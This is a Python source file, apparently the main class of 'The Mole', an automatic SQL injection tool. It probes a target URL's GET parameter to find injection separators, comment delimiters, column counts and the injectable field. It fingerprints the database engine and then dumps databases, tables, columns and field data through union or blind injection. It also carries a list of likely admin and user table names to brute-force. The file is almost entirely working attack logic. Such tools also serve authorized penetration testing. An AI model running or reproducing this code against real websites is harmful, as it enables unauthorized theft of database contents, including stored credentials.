#!/usr/bin/python3
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
#
# Authors:
# Matías Fontanini
# Santiago Alessandri
# Gastón Traberg

from domanalyser import DomAnalyser,NeedleNotFound
from dbmsmoles import DbmsMole, MysqlMole, PostgresMole, SQLServerMole, OracleMole
from dbdump import DatabaseDump
from threader import Threader
from output import BlindSQLIOutput
from xmlexporter import XMLExporter
from injectioninspector import InjectionInspector
from datadumper import *
import connection
import time,sys

class TheMole:

    ex_string = 'Operation not supported for this dumper'
    field = '[_SQL_Field_]'
    table = '[_SQL_Table_]'
    wildcard = '[_SQL_]'

    users_tables = [
        'adm',
        'admin',
        'admins',
        'administrator',
        'administrador',
        'administradores',
        'client',
        'clients',
        'login',
        'logins',
        'user',
        'users',
        'usuario',
        'usuarios',
        'usr',
        'usrs',
    ]

    dbms_mole_list = [MysqlMole, SQLServerMole, PostgresMole, OracleMole]

    def __init__(self, threads = 4):
        self.initialized = False
        self.needle = None
        self.url = None
        self.requester = None
        self.mode = 'union'
        self.threader = Threader(threads)
        self.prefix = ''
        self.end = ''
        self.verbose = False
        self.timeout = 0
        self.separator = ''
        self.comment = ''
        self.parenthesis = 0
        self._dbms_mole = None
        self.stop_query = False
        self.query_columns = None
        self.injectable_field = None
        self.database_dump = DatabaseDump()

    def restart(self):
        self.initialized = False

    def initialize(self):
        self.analyser = DomAnalyser()
        if not self.requester:
            raise MoleAttributeRequired('Attribute requester is required')
        if not self.url:
            raise MoleAttributeRequired('Attribute url is required')
        if not self.wildcard:
            raise MoleAttributeRequired('Attribute wildcard is required')
        if not self.needle:
            raise MoleAttributeRequired('Attribute needle is required')
        self.separator = ''
        self.comment = ''
        self.parenthesis = 0
        self._dbms_mole = None
        self.database_dump = DatabaseDump()
        injection_inspector = InjectionInspector()

        original_request = self.requester.request(self.url.replace(self.wildcard, self.prefix))
        try:
            self.analyser.set_good_page(original_request, self.needle)
        except NeedleNotFound:
            print('[-] Could not find needle.')
            return

        try:
            self.separator, self.parenthesis = injection_inspector.find_separator(self)
        except SQLInjectionNotDetected:
            print('[-] Could not detect SQL Injection.')
            return

        if not self.separator == ' ':
            self.end = 'and {op_par}' + '{sep}1{sep} like {sep}1'.format(sep=self.separator, par=(self.parenthesis * ')'))
        else:
            self.end = ' '

        if self.mode == 'union':
            try:
                self._detect_dbms_blind()
            except:
                print('[i] Early DBMS detection failed. Retrying later.')

            self.end = ''
            req = self.make_request(' own3d by 1')
            self._syntax_error_content = self.analyser.node_content(req)

            try:
                self.comment, self.parenthesis = injection_inspector.find_comment_delimiter(self)
                print('[+] Found comment delimiter:', self.comment)
            except Exception:
                print('[-] Could not exploit SQL Injection.')
                return

            self.query_columns = injection_inspector.find_column_number(self)

            try:
                self.injectable_field = injection_inspector.find_injectable_field(self)
                print('[+] Found injectable field:', self.injectable_field + 1)
            except Exception as ex:
                print(ex)
                print('[-] Could not exploit SQL Injection.')
                return

            if self._dbms_mole is None:
                print('[-] Could not detect DBMS.')
                return

            if self._dbms_mole.is_string_query():
                self.dumper = StringUnionDataDumper()
            else:
                self.dumper = IntegerUnionDataDumper()
        else:
            self._detect_dbms_blind()
            self.dumper = BlindDataDumper()

        self.initialized = True

    def generate_url(self, injection_string):
        url = self.url.replace(
                self.wildcard,
                ('{prefix}{sep}{par}' + injection_string + '{end}{com}').format(
                                        sep=self.separator,
                                        com=self.comment,
                                        par=(self.parenthesis * ')'),
                                        op_par=(self.parenthesis * '('),
                                        prefix=self.prefix,
                                        end=self.end.format(op_par=(self.parenthesis * '(')))
        )
        if self.verbose == True:
            print('[i] Executing query:',url)
        return url

    def make_request(self, query):
        req = self.get_requester().request(self.generate_url(query))
        return req

    def get_requester(self):
        return self.requester

    def set_mode(self, mode):
        if mode == 'blind':
            if self.initialized and self.separator != ' ':
                self.end =  ' and {sep}{sep} like {sep}'.format(sep=self.separator)
            self.comment = ''
            self.parenthesis = 0
        else:
            self.initialized = False
        self.mode = mode

    def poll_databases(self):
        if self.database_dump.db_map:
            return list(self.database_dump.db_map.keys())
        else:
            return None

    def abort_query(self):
        self.stop_query = True

    def get_databases(self, force_fetch=False):
        if not force_fetch and self.database_dump.db_map:
            return list(self.database_dump.db_map.keys())
        data = self.dumper.get_databases(self, self.query_columns, self.injectable_field)
        for i in data:
            self.database_dump.add_db(i)
        return data

    def poll_tables(self, db):
        if self.database_dump.db_map[db]:
            return list(self.database_dump.db_map[db].keys())
        else:
            return None

    def get_tables(self, db, force_fetch=False):
        if not force_fetch and db in self.database_dump.db_map and self.database_dump.db_map[db]:
            return list(self.database_dump.db_map[db].keys())

        data = self.dumper.get_tables(self, db, self.query_columns, self.injectable_field)
        for i in data:
            self.database_dump.add_table(db, i)
        return data

    def poll_columns(self, db, table):
        if self.database_dump.db_map[db][table]:
            return list(self.database_dump.db_map[db][table])
        else:
            return None

    def get_columns(self, db, table, force_fetch=False):
        if not force_fetch and db in self.database_dump.db_map and table in self.database_dump.db_map[db] and len(self.database_dump.db_map[db][table]) > 0:
            return list(self.database_dump.db_map[db][table])

        data = self.dumper.get_columns(self, db, table, self.query_columns, self.injectable_field)
        for i in data:
            self.database_dump.add_column(db, table, i)
        return data

    def get_fields(self, db, table, fields, where="1=1"):
        return self.dumper.get_fields(self, db, table, fields, where, self.query_columns, self.injectable_field)

    def get_dbinfo(self):
        return self.dumper.get_dbinfo(self, self.query_columns, self.injectable_field)

    def find_tables_like(self, db, table_filter):
        return self.dumper.find_tables_like(self, db, table_filter, self.query_columns, self.injectable_field)

    def read_file(self, filename):
        print("[-] Not implemented yet!")
        #~ data = self._generic_query_item(
                    #~ lambda x: self._dbms_mole.read_file_query(filename, self.query_columns, self.injectable_field), 0, lambda x: ''.join(x)
                #~ )
        #~ return data

    def brute_force_tables(self, db, table_list):
        print("[-] Not implemented yet!")
        #~ for table in table_list:
            #~ print('[i] Trying table', table)
            #~ try:
                #~ exists = False
                #~ if self.mode == 'union':
                    #~ req = self.get_requester().request(self.generate_url(self._dbms_mole.fields_count_query(db, table, self.query_columns, self.injectable_field)))
                    #~ exists = not self._dbms_mole.parse_results(self.analyser.decode(req)) is None
                #~ else:
                    #~ req = self.get_requester().request(self.generate_url(
                                #~ self._dbms_mole.fields_blind_count_query('>', 100000000, db=db, table=table),
                             #~ ))
                    #~ if self.analyser.is_valid(req):
                        #~ exists = True
                #~ if exists:
                    #~ print('[+] Table',table,'exists.')
            #~ except:
                #~ pass

    def brute_force_users_tables(self, db):
        print("[-] Not implemented yet!")
        #~ self.brute_force_tables(db, TheMole.users_tables)

    def set_url(self, url):
        if not '?' in url:
            raise Exception('URL requires GET parameters')

        url = url.split('?')
        self.requester = connection.HttpRequester(url[0], timeout=self.timeout)
        self.url = url[1]
        if self.wildcard not in self.url:
            self.url += self.wildcard

    def get_url(self):
        try:
            return self.requester.url + '?' + self.url
        except AttributeError:
            return ''

    def export_xml(self, filename):
        if not self.initialized:
            print("[-] Cannot export if mole isn't initialized")
            return
        exporter = XMLExporter()
        try:
            exporter.export(self, self.database_dump.db_map, filename)
            print("[+] Exportation successful")
        except Exception:
            print("[-] Exportation NOT successful")

    def import_xml(self, filename):
        exporter = XMLExporter()
        try:
            exporter.load(self, self.database_dump.db_map, filename)
            self.initialized = True
            print("[+] Importation successful")
        except Exception:
            print("[-] Importation NOT successful")

    def _detect_dbms_blind(self):
        for dbms_mole_class in TheMole.dbms_mole_list:
            print('[i] Trying DBMS', dbms_mole_class.dbms_name())
            query = dbms_mole_class.dbms_check_blind_query()
            url_query = self.generate_url(query)
            req = self.get_requester().request(url_query)
            if self.analyser.is_valid(req):
                self._dbms_mole = dbms_mole_class()
                print('[+] Found DBMS:', dbms_mole_class.dbms_name())
                return
        raise Exception('[-] Could not detect DBMS')



class SQLInjectionNotDetected(Exception):
    pass

class SQLInjectionNotExploitable(Exception):
    pass



class MoleAttributeRequired(Exception):
    def __init__(self, msg):
        self.message = msg
